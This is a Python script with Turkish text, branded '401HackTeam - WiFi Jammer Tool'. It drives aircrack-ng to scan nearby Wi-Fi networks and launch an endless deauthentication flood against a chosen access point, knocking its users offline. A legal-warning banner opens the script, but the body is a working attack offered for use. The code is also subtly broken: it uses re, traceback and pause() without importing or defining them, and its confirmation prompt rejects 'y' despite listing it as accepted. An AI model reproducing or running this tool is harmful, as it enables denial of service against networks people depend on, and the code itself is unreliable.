# -*- coding: utf-8 -*-
# wifi_jammer.py - DİKKAT: YASA DIŞI KULLANIM! DONANIM/ROOT GEREKTİRİR!

import os
import sys
import subprocess
import time
import shutil # shutil.which için

# Renkler (opsiyonel)
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    R = Fore.RED; Y = Fore.YELLOW; G = Fore.GREEN; C = Fore.CYAN; W = Fore.WHITE; RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT
except ImportError:
    print("Uyarı: Renkli çıktılar için 'colorama' kütüphanesi gerekli ('pip install colorama').")
    R = Y = G = C = W = RESET = ""
    BOLD = ""

# --- ÇOK ÖNEMLİ YASAL UYARI ve GEREKSİNİMLER ---
print(f"""{R}{BOLD}
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!      YASAL UYARI & GEREKSİNİMLER & RİSKLER            !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
- WiFi Deauthentication (Deauth) saldırıları yapmak ve başkalarının
  kablosuz ağ bağlantısını kesmek çoğu ülkede KESİNLİKLE YASA DIŞIDIR!
- Bu aracı ASLA size ait olmayan veya test etme izniniz olmayan
  ağlara karşı KULLANMAYIN! Yasal sonuçları çok ağır olabilir.
- Bu araç SADECE eğitim ve kendi ağınızdaki güvenlik açıklarını
  anlama amacıyla kullanılmalıdır.
- ÇALIŞMASI İÇİN ZORUNLU ŞARTLAR:
    1) Linux İşletim Sistemi
    2) Root Yetkileri (sudo veya root olarak çalıştırma)
    3) 'aircrack-ng' Paketinin Kurulu Olması (airmon-ng, airodump-ng, aireplay-ng içerir)
    4) Monitor Modu ve Paket Göndermeyi DESTEKLEYEN UYUMLU WiFi Adaptörü!
- Yanlış kullanılırsa ağlara zarar verebilir.
- TÜM SORUMLULUK KULLANICIYA AİTTİR! NE YAPTIĞINIZI BİLİN!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
{RESET}""")
try:
    confirm = input(f"{Y}Tüm uyarıları okudum, anladım ve riskleri kabul ediyorum. Devam etmek istiyor musunuz? (e/y): {RESET}").strip().lower()
    if confirm not in ['e', 'y']: sys.exit(f"{G}İşlem iptal edildi.{RESET}")
    elif confirm == 'e': print(f"{R}YASADIŞI VE RİSKLİ OLABİLECEK İŞLEM BAŞLATILIYOR...{RESET}"); time.sleep(2)
    else: sys.exit(f"{G}İşlem iptal edildi.{RESET}")
except KeyboardInterrupt: sys.exit(f"\n{G}İşlem iptal edildi.{RESET}")
# ===========================================================

class WifiJammerTool:
    def __init__(self):
        self.selected_interface = None # Seçilen monitor mod arayüzü
        self.original_interface = None # Monitor moda alınan orijinal arayüz
        if not self.check_requirements(): # Önce gereksinimleri kontrol et
             sys.exit(1)
        self.main_menu()

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def show_banner(self):
        # Banner güncellendi
        self.clear_screen()
        print(f"""{C}{BOLD}
        ╔════════════════════════════════════════════╗
        ║        401HackTeam - WiFi Jammer Tool        ║
        ║      (DİKKAT: YASAL VE ETİK KULLANIN!)       ║
        ╠════════════════════════════════════════════╣
        ║ {G}1. Kullanılabilir Arayüzleri Listele/Seç{C}    ║
        ║ {G}2. Seçili Arayüzle WiFi Ağlarını Tara{C}       ║
        ║ {R}3. Seçili Ağa Jammer Başlat (Deauth){C}     ║
        ║ {Y}4. Monitor Modu Kapat / Normal Haline Dön{C} ║
        ║ {R}q. Çıkış{C}                                  ║
        ╚════════════════════════════════════════════╝{RESET}
        """)
        if self.selected_interface:
             print(f"{Y}Aktif Monitor Arayüzü: {self.selected_interface}{RESET}")
        elif self.original_interface:
             print(f"{Y}Orijinal Arayüz: {self.original_interface} (Monitor mod aktif değil){RESET}")

    def check_root(self):
        """Root yetkisi kontrolü (Linux için)."""
        if os.name == 'posix' and os.geteuid() != 0:
            print(f"{R}HATA: Bu araç root yetkisi gerektirir!{RESET}")
            print(f"{Y}Lütfen 'sudo python3 {sys.argv[0]}' şeklinde çalıştırın.{RESET}")
            return False
        # Windows'ta veya root ise True dön
        return True

    def check_requirements(self):
        """Gerekli araçların (aircrack-ng) varlığını kontrol eder."""
        print(f"{C}Gerekli araçlar kontrol ediliyor...{RESET}")
        if not self.check_root(): return False # Root kontrolü

        required_tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'iwconfig'] # iwconfig de ekleyelim
        missing = []
        for tool in required_tools:
            if not shutil.which(tool):
                missing.append(tool)

        if missing:
            print(f"{R}HATA: Gerekli araçlar eksik!{RESET}")
            print(f"{R}Eksik: {', '.join(missing)}{RESET}")
            print(f"{Y}Lütfen 'aircrack-ng' paketini ve kablosuz araçlarını kurun.{RESET}")
            print(f"{Y}Debian/Ubuntu: sudo apt update && sudo apt install aircrack-ng wireless-tools{RESET}")
            print(f"{Y}Arch: sudo pacman -S aircrack-ng wireless_tools{RESET}")
            return False

        print(f"{G}Gerekli araçlar (aircrack-ng suite) bulundu.{RESET}")
        return True

    def list_interfaces(self):
        """Kullanılabilir kablosuz arayüzleri listeler."""
        print(f"\n{C}--- Kablosuz Arayüzler Aranıyor (airmon-ng) ---{RESET}")
        try:
             # airmon-ng doğrudan çalıştırıldığında arayüzleri listeler
             process = subprocess.run(['airmon-ng'], capture_output=True, text=True, check=False)
             if process.returncode != 0 and "command not found" in process.stderr.lower():
                  print(f"{R}Hata: 'airmon-ng' çalıştırılamadı! aircrack-ng kurulu mu?{RESET}")
                  return []
             print(process.stdout)
             # Kullanıcıdan seçim alabiliriz ama şimdilik sadece listeleme
             # Arayüz isimlerini parse etmek gerekebilir
             interfaces = re.findall(r'^(\w+)\s+[\w\d]+\s+.*', process.stdout, re.MULTILINE)
             return interfaces
        except Exception as e:
             print(f"{R}Arayüzler listelenirken hata: {e}{RESET}")
             traceback.print_exc()
             return []

    def select_interface(self):
         """Kullanıcıdan kablosuz arayüz seçmesini ister."""
         interfaces = self.list_interfaces()
         if not interfaces:
              print(f"{R}Kullanılabilir kablosuz arayüz bulunamadı.{RESET}")
              return None

         while True:
              choice = input(f"{Y}Monitor moda alınacak arayüzü girin (örn: wlan0) (q=iptal): {RESET}").strip()
              if choice.lower() == 'q': return None
              # Seçimin listede olup olmadığını kontrol etmek daha iyi olurdu ama şimdilik kabul edelim
              if choice:
                   self.original_interface = choice # Orijinal arayüzü sakla
                   return choice
              else:
                   print(f"{R}Arayüz adı boş olamaz.{RESET}")

    def start_monitor_mode(self, interface):
        """Seçilen arayüzü monitor moda alır."""
        if not interface: return False
        print(f"\n{C}[+] '{interface}' monitor moda alınıyor...{RESET}")
        try:
            # Önce mevcut monitor modları durdurmayı deneyelim (check kill)
            print(f"{C}   Mevcut monitor modlar durduruluyor (check kill)...{RESET}")
            subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, check=False)
            time.sleep(1)

            # Monitor modu başlat
            print(f"{C}   'airmon-ng start {interface}' çalıştırılıyor...{RESET}")
            process = subprocess.run(["airmon-ng", "start", interface], capture_output=True, text=True, check=False)
            print(f"{Y}Airmon-ng Çıktısı:{RESET}\n{process.stdout}\n{process.stderr}")

            # Başlatılan monitor mod arayüzünün adını bulmaya çalış
            # Genellikle 'mon' eklenir (wlan0 -> wlan0mon) veya ismi değişebilir
            # Çıktıdan parse etmek daha güvenilir
            match = re.search(r'monitor mode enabled on (\w+)', process.stdout) # Veya '(wlan\d+mon)' gibi
            if match:
                self.selected_interface = match.group(1)
                print(f"{G}[+] Monitor mod başlatıldı: {self.selected_interface}{RESET}")
                return True
            else:
                 # Eğer standart isim (interface + mon) varsa onu deneyelim
                 potential_mon_iface = interface + "mon"
                 # Arayüzün varlığını kontrol edelim (örn: ip link show)
                 check_ip = subprocess.run(['ip', 'link', 'show', potential_mon_iface], capture_output=True)
                 if check_ip.returncode == 0:
                      self.selected_interface = potential_mon_iface
                      print(f"{G}[+] Monitor mod başlatıldı (tahmini): {self.selected_interface}{RESET}")
                      return True
                 else:
                      print(f"{R}[-] Monitor mod başlatılamadı veya arayüz adı bulunamadı!{RESET}")
                      print(f"{Y}   'ip link' veya 'iwconfig' komutlarıyla monitor mod arayüzünü manuel kontrol edin.{RESET}")
                      self.selected_interface = None
                      return False
        except Exception as e:
            print(f"{R}Monitor mod başlatılırken hata: {e}{RESET}")
            traceback.print_exc()
            self.selected_interface = None
            return False

    def stop_monitor_mode(self):
        """Aktif monitor mod arayüzünü durdurur."""
        if not self.selected_interface:
            print(f"{Y}Durdurulacak aktif monitor mod arayüzü yok.{RESET}")
            # Orijinal arayüz varsa onu normale döndürmeyi deneyebiliriz
            if self.original_interface:
                 print(f"{C}Orijinal arayüz '{self.original_interface}' normale döndürülüyor (deneniyor)...{RESET}")
                 try:
                      subprocess.run(["airmon-ng", "stop", self.original_interface + "mon"], capture_output=True, check=False) # Tahmini isimle durdur
                      subprocess.run(["airmon-ng", "stop", self.original_interface], capture_output=True, check=False) # Orijinal isimle durdur
                      # Ağ yöneticisini yeniden başlatmak gerekebilir
                      print(f"{Y}Ağ yöneticisini yeniden başlatmanız önerilir (örn: sudo systemctl restart NetworkManager).{RESET}")
                 except Exception as e: print(f"{R}Durdurma sırasında hata: {e}{RESET}")
            return False

        print(f"\n{C}[+] Monitor mod durduruluyor: {self.selected_interface}...{RESET}")
        try:
            process = subprocess.run(["airmon-ng", "stop", self.selected_interface], capture_output=True, text=True, check=False)
            print(f"{Y}Airmon-ng Çıktısı:{RESET}\n{process.stdout}\n{process.stderr}")
            print(f"{G}[+] Monitor mod durduruldu.{RESET}")
            # Ağ yöneticisini yeniden başlatmak genellikle iyi bir fikirdir
            print(f"{Y}Ağ yöneticisini yeniden başlatmanız önerilir (örn: sudo systemctl restart NetworkManager).{RESET}")
            self.selected_interface = None # Aktif arayüzü temizle
            self.original_interface = None # Orijinal arayüzü de temizle
            return True
        except Exception as e:
            print(f"{R}Monitor mod durdurulurken hata: {e}{RESET}")
            traceback.print_exc()
            return False

    def scan_wifi(self):
        """airodump-ng ile WiFi ağlarını tarar."""
        if not self.selected_interface:
            print(f"{R}Hata: Önce bir arayüz seçip monitor moda almalısınız (Seçenek 1).{RESET}")
            return None

        print(f"\n{C}[+] WiFi ağları '{self.selected_interface}' ile taranıyor (Durdurmak için Ctrl+C)...{RESET}")
        networks = {} # Bulunan ağları saklamak için (BSSID -> Info)
        try:
            # airodump-ng komutunu başlat
            # --write-interval 1 --output-format csv gibi seçeneklerle dosyaya yazdırıp okumak daha sağlam olur.
            # Şimdilik canlı çıktıyı işleyelim (daha zor).
            cmd = ["airodump-ng", self.selected_interface]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8')

            print(f"{Y}Tarama başladı... Lütfen bekleyin (Ctrl+C ile durdurabilirsiniz).{RESET}")

            # Çıktıyı satır satır oku ve işle (bu kısım airodump-ng çıktısına çok bağımlı)
            bssid_section = False
            start_time = time.time()
            scan_duration = 15 # Kaç saniye tarama yapsın?

            while time.time() - start_time < scan_duration:
                 if process.poll() is not None: # İşlem bittiyse
                      break
                 try:
                      # stderr genellikle ilerlemeyi gösterir, stdout veriyi
                      # Non-blocking okuma yapmak daha iyi olurdu ama basit tutalım
                      line = process.stdout.readline()
                      if not line: # Boş satır gelirse biraz bekle
                           time.sleep(0.1)
                           continue

                      line = line.strip()
                      # print(line) # Debug: Ham çıktıyı gör

                      # Çıktıdaki BSSID bölümünü bul
                      if "BSSID" in line and "STATION" not in line:
                           bssid_section = True
                           continue # Başlık satırını atla
                      if "STATION" in line: # İstemci bölümüne gelince AP bölümü biter
                           bssid_section = False
                           continue

                      if bssid_section and len(line.split()) > 8: # AP satırı mı? (Basit kontrol)
                           parts = line.split()
                           bssid = parts[0]
                           # MAC adresi formatını kontrol et (daha sağlam kontrol eklenebilir)
                           if len(bssid) == 17 and bssid.count(':') == 5:
                                power = parts[3]
                                beacons = parts[4]
                                data = parts[5]
                                channel = parts[8]
                                enc = parts[9] # Şifreleme (WEP, WPA, WPA2 vb.)
                                cipher = parts[10]
                                auth = parts[11]
                                essid = " ".join(parts[13:]) # ESSID sonda yer alır

                                networks[bssid] = {'ch': channel, 'enc': enc, 'essid': essid, 'pwr': power}
                 except Exception as parse_err:
                      # print(f"Parse hatası: {parse_err}") # Debug
                      pass # Hatalı satırları atla

            # Süre dolunca işlemi durdur
            print(f"\n{Y}Tarama süresi doldu, airodump-ng durduruluyor...{RESET}")
            process.terminate() # Önce kibarca durdurmayı dene
            try:
                 process.wait(timeout=5) # 5 saniye bekle
            except subprocess.TimeoutExpired:
                 process.kill() # Kapanmazsa zorla kapat

            # Sonuçları yazdır
            if not networks:
                print(f"{R}[-] Hiç WiFi ağı bulunamadı!{RESET}")
                return None

            print(f"\n{G}[+] Bulunan WiFi Ağları:{RESET}")
            network_list = []
            print(f"{W}{BOLD}{'No':<4} {'BSSID':<18} {'CH':<3} {'ENC':<8} {'PWR':<5} {'ESSID'}{RESET}")
            print("-" * 60)
            for i, (bssid, info) in enumerate(networks.items()):
                 # ESSID'de gizli karakterler olabilir, temizleyelim
                 clean_essid = ''.join(c for c in info['essid'] if c.isprintable()) or "<Gizli SSID>"
                 print(f"{Y}{i+1:<4}{RESET} {bssid:<18} {info['ch']:<3} {info['enc']:<8} {info['pwr']:<5} {clean_essid}")
                 network_list.append({'no': i+1, 'bssid': bssid, 'ch': info['ch'], 'essid': clean_essid})
            return network_list

        except KeyboardInterrupt:
            print(f"\n{Y}Tarama kullanıcı tarafından durduruldu.{RESET}")
            if 'process' in locals() and process.poll() is None:
                process.terminate()
                try: process.wait(timeout=2)
                except subprocess.TimeoutExpired: process.kill()
            return None # Ctrl+C durumunda None dön
        except Exception as e:
            print(f"{R}Tarama sırasında hata: {e}{RESET}")
            traceback.print_exc()
            if 'process' in locals() and process.poll() is None: process.kill() # Hata durumunda da işlemi kapat
            return None

    def start_jammer(self, bssid, channel):
        """aireplay-ng ile deauth saldırısı başlatır."""
        if not self.selected_interface:
             print(f"{R}Hata: Aktif monitor mod arayüzü yok! (Önce Seçenek 1){RESET}")
             return

        print(f"\n{R}{BOLD}⚠️ UYARI: Deauth Saldırısı Başlatılıyor! ⚠️{RESET}")
        print(f"{R}   Hedef BSSID: {bssid}{RESET}")
        print(f"{R}   Arayüz: {self.selected_interface}, Kanal: {channel}{RESET}")
        print(f"{R}   Bu işlem yasa dışıdır ve ağları KESİNTİYE UĞRATIR!{RESET}")
        print(f"{Y}   Durdurmak için Ctrl+C'ye basın.{RESET}")
        time.sleep(3)

        try:
            # Önce kanalı ayarlayalım (aireplay bazen yapmaz)
            print(f"{C}   Kanal ayarlanıyor: {channel}...{RESET}")
            subprocess.run(['iwconfig', self.selected_interface, 'channel', channel], check=False)
            time.sleep(0.5)

            # aireplay-ng komutu
            # --deauth 0: Sürekli deauth paketi gönder (0=sonsuz)
            # -a <bssid>: Hedef AP'nin MAC adresi
            # <interface>: Monitor moddaki arayüz
            cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, self.selected_interface]
            print(f"{C}   Komut çalıştırılıyor: {' '.join(cmd)}{RESET}")

            # Komutu başlat ve bitmesini bekle (Ctrl+C ile kesilene kadar)
            process = subprocess.Popen(cmd)
            process.wait() # Ctrl+C gelene kadar burada bekler

        except KeyboardInterrupt:
            print(f"\n{Y}Ctrl+C algılandı. Jammer durduruluyor...{RESET}")
            if 'process' in locals() and process.poll() is None:
                process.terminate() # Önce kibarca durdur
                time.sleep(1)
                if process.poll() is None: process.kill() # Kapanmazsa zorla
        except FileNotFoundError:
             print(f"{R}Hata: 'aireplay-ng' komutu bulunamadı! aircrack-ng kurulu mu?{RESET}")
        except Exception as e:
            print(f"{R}Jammer çalıştırılırken hata: {e}{RESET}")
            traceback.print_exc()
            if 'process' in locals() and process.poll() is None: process.kill()


    def main_menu(self):
        """Ana menü döngüsü."""
        networks = None # Taranan ağları sakla
        current_original_interface = None # Monitor mod için seçilen arayüz

        while True:
            self.show_banner() # Her seferinde banner ve aktif arayüzü göster

            choice = input(f"{G}\n>> Seçiminiz (1-4/q): {RESET}").strip().lower()

            if choice == '1':
                # Arayüz seç ve monitor moda al
                if self.selected_interface:
                     print(f"{Y}Zaten aktif bir monitor arayüzü var: {self.selected_interface}{RESET}")
                     print(f"{Y}Devam etmek için önce kapatın (Seçenek 4).{RESET}")
                else:
                     iface_to_monitor = self.select_interface()
                     if iface_to_monitor:
                          current_original_interface = iface_to_monitor # Sakla
                          self.start_monitor_mode(iface_to_monitor)
                pause()
            elif choice == '2':
                # Ağları tara
                networks = self.scan_wifi() # Taranan ağı listeye ata
                pause()
            elif choice == '3':
                 # Jammer başlat
                 if not self.selected_interface:
                      print(f"{R}Hata: Önce bir arayüz seçip monitor moda almalısınız (Seçenek 1).{RESET}")
                 elif not networks:
                      print(f"{R}Hata: Önce ağları taramanız gerekiyor (Seçenek 2).{RESET}")
                 else:
                      # Kullanıcıdan hedef seçmesini iste
                      print("\n--- Hedef Ağ Seçimi ---")
                      for net in networks: print(f"{Y}[{net['no']}] {net['bssid']} (CH: {net['ch']}) - {net['essid']}{RESET}")
                      while True:
                           target_no_str = input(f"{Y}Jam yapılacak ağın numarasını girin (q=iptal): {RESET}").strip()
                           if target_no_str.lower() == 'q': break
                           try:
                                target_no = int(target_no_str)
                                # Girilen numaranın listede olup olmadığını kontrol et
                                target_network = next((net for net in networks if net['no'] == target_no), None)
                                if target_network:
                                     self.start_jammer(target_network['bssid'], target_network['ch'])
                                     break # Jammer bittiğinde veya Ctrl+C ile menüye döner
                                else:
                                     print(f"{R}Geçersiz numara!{RESET}")
                           except ValueError:
                                print(f"{R}Lütfen geçerli bir numara girin.{RESET}")
                 pause() # Jammer'dan sonra veya hata durumunda
            elif choice == '4':
                # Monitor modu kapat
                self.stop_monitor_mode()
                pause()
            elif choice == 'q':
                print(f"\n{Y}Çıkılıyor... Monitor mod açıksa kapatılıyor...{RESET}")
                self.stop_monitor_mode() # Çıkmadan önce kapatmayı dene
                print(f"{G}Güle güle!{RESET}")
                sys.exit(0)
            else:
                print(f"{R}Geçersiz seçim!{RESET}")
                time.sleep(1)


if __name__ == "__main__":
    try:
        WifiJammerTool()
    except KeyboardInterrupt:
        print(f"\n{G}Program sonlandırıldı.{RESET}")
        # Çıkarken monitör modunu kapatmak için try-finally bloğu eklenebilir
    except Exception as e:
        print(f"\n{R}{BOLD}Beklenmedik Kritik Hata:{RESET}\n{e}")
        traceback.print_exc()